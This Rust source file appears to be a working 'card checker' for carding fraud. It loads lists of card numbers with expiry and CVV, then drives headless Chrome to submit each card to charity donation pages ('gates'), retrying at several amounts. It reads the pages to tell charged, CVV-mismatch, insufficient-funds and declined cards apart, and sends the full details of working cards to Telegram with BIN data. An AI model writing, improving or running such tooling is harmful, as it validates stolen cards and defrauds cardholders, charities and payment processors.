use crate::common::{CardData, CheckResult, Gate, BACKOFF_AMOUNTS};
use crate::stats::Stats;
use anyhow::{Context, Result};
use colored::*;
use std::collections::HashMap;
use std::fs;
use std::io::{self, Write};
use std::time::Duration;
use thirtyfour::prelude::*;

/// Wait for element to be interactable with retry logic
async fn wait_and_interact<F, Fut>(
    driver: &WebDriver,
    selector: &str,
    action: F,
    max_retries: u32,
) -> Result<()>
where
    F: Fn(WebElement) -> Fut,
    Fut: std::future::Future<Output = Result<(), WebDriverError>>,
{
    for attempt in 0..max_retries {
        if let Ok(element) = driver.find(By::Css(selector)).await {
            // Wait for element to be displayed and enabled
            tokio::time::sleep(Duration::from_millis(500)).await;
            
            // Scroll element into view
            driver.execute("arguments[0].scrollIntoView({block: 'center'});", vec![element.to_json()?]).await?;
            tokio::time::sleep(Duration::from_millis(300)).await;
            
            // Try the action
            match action(element).await {
                Ok(_) => return Ok(()),
                Err(e) if attempt < max_retries - 1 => {
                    // Element not interactable, wait and retry
                    tokio::time::sleep(Duration::from_secs(1)).await;
                    continue;
                }
                Err(e) => return Err(e.into()),
            }
        }
    }
    
    anyhow::bail!("Element not found or not interactable: {}", selector)
}

/// Try to make a donation with the given amount - improved version
async fn try_donation_improved(
    driver: &WebDriver,
    card: &CardData,
    gate_url: &str,
    amount: f64,
) -> Result<String> {
    // Navigate to donation page
    driver.goto(gate_url).await?;
    tokio::time::sleep(Duration::from_secs(4)).await;
    
    // Try to find and fill amount field with retry logic
    let amount_selectors = vec![
        "input[name*='amount']",
        "input[id*='amount']",
        "input[name*='donation']",
        "input[id*='donation']",
        "input[type='number']",
        "#amount",
        "#donation-amount",
        "#custom-amount",
    ];
    
    let mut amount_filled = false;
    for selector in &amount_selectors {
        if let Ok(_) = wait_and_interact(
            driver,
            selector,
            |elem| async move {
                elem.click().await?;
                tokio::time::sleep(Duration::from_millis(500)).await;
                elem.clear().await?;
                elem.send_keys(&amount.to_string()).await
            },
            3, // 3 retries
        ).await {
            amount_filled = true;
            break;
        }
    }
    
    // If no input field, try clicking amount button
    if !amount_filled {
        let amount_str = format!("${}", amount);
        if let Ok(buttons) = driver.find_all(By::Css("button, a, div[role='button']")).await {
            for button in buttons {
                if let Ok(text) = button.text().await {
                    if text.contains(&amount_str) || text.contains(&amount.to_string()) {
                        // Scroll into view and click
                        driver.execute("arguments[0].scrollIntoView({block: 'center'});", vec![button.to_json()?]).await?;
                        tokio::time::sleep(Duration::from_millis(500)).await;
                        button.click().await?;
                        amount_filled = true;
                        break;
                    }
                }
            }
        }
    }
    
    tokio::time::sleep(Duration::from_secs(2)).await;
    
    // Check if we need to switch to Stripe iframe
    let mut in_iframe = false;
    let iframe_selectors = vec!["iframe[name*='stripe']", "iframe[src*='stripe']"];
    
    for selector in &iframe_selectors {
        if let Ok(iframe) = driver.find(By::Css(*selector)).await {
            tokio::time::sleep(Duration::from_secs(1)).await;
            driver.switch_to().frame_element(&iframe).await?;
            in_iframe = true;
            
            // Fill card in iframe with retry logic
            if let Ok(_) = wait_and_interact(
                driver,
                "input[name='cardnumber'], input[placeholder*='Card']",
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(500)).await;
                    elem.send_keys(&card.number).await
                },
                3,
            ).await {
                // Fill expiry
                let _ = wait_and_interact(
                    driver,
                    "input[name='exp-date'], input[placeholder*='MM']",
                    |elem| async move {
                        elem.click().await?;
                        tokio::time::sleep(Duration::from_millis(300)).await;
                        elem.send_keys(&format!("{}{}", card.month, &card.year[2..])).await
                    },
                    3,
                ).await;
                
                // Fill CVV
                let _ = wait_and_interact(
                    driver,
                    "input[name='cvc'], input[placeholder*='CVC']",
                    |elem| async move {
                        elem.click().await?;
                        tokio::time::sleep(Duration::from_millis(300)).await;
                        elem.send_keys(&card.cvv).await
                    },
                    3,
                ).await;
                
                driver.switch_to().default_content().await?;
                break;
            }
        }
    }
    
    // If not in iframe, fill directly with retry logic
    if !in_iframe {
        // Card number
        let card_selectors = vec![
            "input[name*='card']",
            "input[id*='card']",
            "input[autocomplete='cc-number']"
        ];
        
        for selector in &card_selectors {
            if let Ok(_) = wait_and_interact(
                driver,
                selector,
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(500)).await;
                    elem.send_keys(&card.number).await
                },
                3,
            ).await {
                break;
            }
        }
        
        // Month
        for selector in &["input[name*='month']", "select[name*='month']"] {
            if let Ok(_) = wait_and_interact(
                driver,
                selector,
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    elem.send_keys(&card.month).await
                },
                3,
            ).await {
                break;
            }
        }
        
        // Year
        for selector in &["input[name*='year']", "select[name*='year']"] {
            if let Ok(_) = wait_and_interact(
                driver,
                selector,
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    elem.send_keys(&card.year).await
                },
                3,
            ).await {
                break;
            }
        }
        
        // CVV
        for selector in &["input[name*='cvv']", "input[name*='cvc']", "input[id*='cvv']"] {
            if let Ok(_) = wait_and_interact(
                driver,
                selector,
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    elem.send_keys(&card.cvv).await
                },
                3,
            ).await {
                break;
            }
        }
    }
    
    // Fill email and name with retry logic
    let _ = wait_and_interact(
        driver,
        "input[type='email'], input[name*='email']",
        |elem| async move {
            elem.click().await?;
            tokio::time::sleep(Duration::from_millis(300)).await;
            elem.send_keys("donor@example.com").await
        },
        3,
    ).await;
    
    let _ = wait_and_interact(
        driver,
        "input[name*='name'], input[id*='name']",
        |elem| async move {
            elem.click().await?;
            tokio::time::sleep(Duration::from_millis(300)).await;
            elem.send_keys("Test Donor").await
        },
        3,
    ).await;
    
    tokio::time::sleep(Duration::from_secs(1)).await;
    
    // Find and click submit button with retry logic
    let submit_selectors = vec![
        "button[type='submit']",
        "input[type='submit']",
        "#submit",
        "#donate-button",
    ];
    
    for selector in &submit_selectors {
        if let Ok(_) = wait_and_interact(
            driver,
            selector,
            |elem| async move { elem.click().await },
            3,
        ).await {
            break;
        }
    }
    
    // Wait longer for payment processing
    tokio::time::sleep(Duration::from_secs(8)).await;
    
    // Get current URL to check for redirect
    let current_url = driver.current_url().await?;
    let url_lower = current_url.to_string().to_lowercase();
    
    // Get page content to analyze result
    let page_source = driver.source().await?;
    let content_lower = page_source.to_lowercase();
    
    // First check for explicit error messages (most reliable)
    
    // CVV mismatch indicators (check first as they're most specific)
    let cvv_indicators = [
        "incorrect_cvc", "invalid_cvc", "incorrect cvc", "invalid cvc",
        "security code is incorrect", "security code is invalid",
        "cvv is incorrect", "cvc is incorrect", "cvv2 is incorrect",
        "card's security code is incorrect", "card verification",
        "security code does not match", "cvc does not match",
    ];
    
    for indicator in &cvv_indicators {
        if content_lower.contains(indicator) {
            return Ok("CVV_MISMATCH".to_string());
        }
    }
    
    // Insufficient funds
    let insufficient_indicators = [
        "insufficient funds", "insufficient_funds", "not enough funds",
        "insufficient balance", "card has insufficient funds",
    ];
    
    for indicator in &insufficient_indicators {
        if content_lower.contains(indicator) {
            return Ok("INSUFFICIENT_FUNDS".to_string());
        }
    }
    
    // Declined indicators
    let declined_indicators = [
        "card was declined", "card has been declined", "payment declined",
        "transaction declined", "declined by", "card declined",
        "payment was declined", "your card was declined",
        "do not honor", "generic_decline", "card_declined",
    ];
    
    for indicator in &declined_indicators {
        if content_lower.contains(indicator) {
            return Ok("DECLINED".to_string());
        }
    }
    
    // Check for success indicators (must be very specific)
    // Look for URL changes that indicate success
    let success_url_indicators = [
        "/thank", "/success", "/complete", "/confirmation", "/receipt",
    ];
    
    let mut url_indicates_success = false;
    for indicator in &success_url_indicators {
        if url_lower.contains(indicator) {
            url_indicates_success = true;
            break;
        }
    }
    
    // Look for very specific success messages in content
    let success_content_indicators = [
        "payment successful", "donation successful", "thank you for your donation",
        "your donation has been", "donation received", "payment received",
        "transaction successful", "order confirmed", "payment confirmed",
        "donation confirmed", "contribution received", "thank you for contributing",
    ];
    
    let mut content_indicates_success = false;
    for indicator in &success_content_indicators {
        if content_lower.contains(indicator) {
            content_indicates_success = true;
            break;
        }
    }
    
    // Only return CHARGED if we have strong evidence
    if url_indicates_success || content_indicates_success {
        // Double-check we don't have error messages
        if !content_lower.contains("error") 
            && !content_lower.contains("declined") 
            && !content_lower.contains("failed") {
            return Ok("CHARGED".to_string());
        }
    }
    
    // If we can't determine, assume declined (safer than false positive)
    Ok("DECLINED".to_string())
}

/// Check card on gate with exponential backoff and stats tracking
async fn check_card_on_gate_with_stats(
    driver: &WebDriver,
    card: &CardData,
    gate: &Gate,
    stats: &mut Stats,
) -> Result<Option<CheckResult>> {
    for &amount in &BACKOFF_AMOUNTS {
        stats.display();
        
        match try_donation_improved(driver, card, &gate.url, amount).await {
            Ok(status) => {
                if status == "CHARGED" || status == "CVV_MISMATCH" || status == "INSUFFICIENT_FUNDS" {
                    stats.record_result(&status);
                    stats.display();
                    return Ok(Some(CheckResult {
                        gate: gate.url.clone(),
                        card: card.masked(),
                        amount,
                        status,
                        success: true,
                    }));
                } else if status == "DECLINED" {
                    // Continue to next amount
                }
            }
            Err(_) => {
                stats.record_error();
                // Continue to next amount
            }
        }
        
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    
    stats.record_result("DECLINED");
    Ok(None)
}

/// Load cards from file with progress indicator
pub fn load_cards_from_file(file_path: &str) -> Result<Vec<CardData>> {
    use std::io::{BufRead, BufReader};
    
    println!("{}", "Loading cards from file...".yellow());
    
    let file = fs::File::open(file_path)
        .context(format!("Failed to open cards file: {}", file_path))?;
    
    let reader = BufReader::new(file);
    let mut cards = Vec::new();
    let mut line_num = 0;
    let mut valid_count = 0;
    let mut error_count = 0;
    
    for line in reader.lines() {
        line_num += 1;
        
        // Show progress every 1000 lines
        if line_num % 1000 == 0 {
            print!("\r{} Loaded {} cards ({} errors)...", "→".cyan(), valid_count, error_count);
            std::io::stdout().flush().ok();
        }
        
        let line = match line {
            Ok(l) => l,
            Err(_) => {
                error_count += 1;
                continue;
            }
        };
        
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        
        match CardData::from_string(line) {
            Ok(card) => {
                cards.push(card);
                valid_count += 1;
            }
            Err(_) => {
                error_count += 1;
            }
        }
    }
    
    println!("\r{} Loaded {} valid cards from {} lines ({} errors)", 
        "✓".green(), valid_count, line_num, error_count);
    
    if cards.is_empty() {
        anyhow::bail!("No valid cards found in file");
    }
    
    Ok(cards)
}

/// Run the improved checker with live stats
pub async fn run_checker_v2(
    gates_file: &str, 
    output_file: &str, 
    max_gates: Option<usize>,
    cards_file: &str,
    telegram_config: Option<&str>,
) -> Result<()> {
    // Load Telegram config if provided
    let telegram_cfg = if let Some(config_path) = telegram_config {
        crate::telegram::load_config(config_path).ok()
    } else {
        None
    };
    
    // Load donation gates
    let gates_json = fs::read_to_string(gates_file)?;
    let gates: Vec<Gate> = serde_json::from_str(&gates_json)?;
    
    // Load cards
    let cards = load_cards_from_file(cards_file)?;
    
    // Determine how many gates to test
    let gates_to_test = if let Some(max) = max_gates {
        &gates[..max.min(gates.len())]
    } else {
        &gates[..]
    };
    
    // Setup WebDriver
    let mut caps = DesiredCapabilities::chrome();
    caps.add_arg("--headless")?;
    caps.add_arg("--no-sandbox")?;
    caps.add_arg("--disable-dev-shm-usage")?;
    caps.add_arg("--disable-gpu")?;
    caps.add_arg("--window-size=1920,1080")?;
    caps.add_arg("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")?;
    
    let driver = WebDriver::new("http://localhost:9515", caps).await?;
    driver.set_page_load_timeout(Duration::from_secs(30)).await?;
    
    // Initialize stats and display
    Stats::init_display();
    let mut stats = Stats::new(cards.len());
    let mut all_results = Vec::new();
    
    // Check cards with live stats
    for card in &cards {
        stats.update_current_card(&format!("{}|{}|{}|{}", card.number, card.month, card.year, card.cvv));
        stats.display();
        
        let mut card_succeeded = false;
        
        // Try card on each gate until it succeeds
        for gate in gates_to_test {
            if let Ok(Some(result)) = check_card_on_gate_with_stats(&driver, card, gate, &mut stats).await {
                all_results.push(result.clone());
                
                // Send to Telegram if configured
                if let Some(ref cfg) = telegram_cfg {
                    let bin = if card.number.len() >= 6 { &card.number[..6] } else { "UNKNOWN" };
                    let bin_info = crate::bin_lookup::lookup_bin(bin).unwrap_or_default();
                    
                    let _ = crate::telegram::notify_success(
                        cfg,
                        &format!("{}|{}|{}|{}", card.number, card.month, card.year, card.cvv),
                        &result.gate,
                        result.amount,
                        &result.status,
                        &bin_info,
                    );
                }
                
                card_succeeded = true;
                break;
            }
            
            tokio::time::sleep(Duration::from_secs(3)).await;
        }
        
        if !card_succeeded {
            stats.record_result("DECLINED");
        }
    }
    
    // Close browser
    driver.quit().await?;
    
    // Save results
    if !all_results.is_empty() {
        let json = serde_json::to_string_pretty(&all_results)?;
        fs::write(output_file, json)?;
        
        // Save working gates
        let working_gates: Vec<String> = all_results
            .iter()
            .map(|r| r.gate.clone())
            .collect();
        
        let mut unique_gates = working_gates;
        unique_gates.sort();
        unique_gates.dedup();
        
        let working_gates_file = output_file.replace(".json", "_working_gates.txt");
        fs::write(&working_gates_file, unique_gates.join("\n"))?;
    }
    
    Ok(())
}
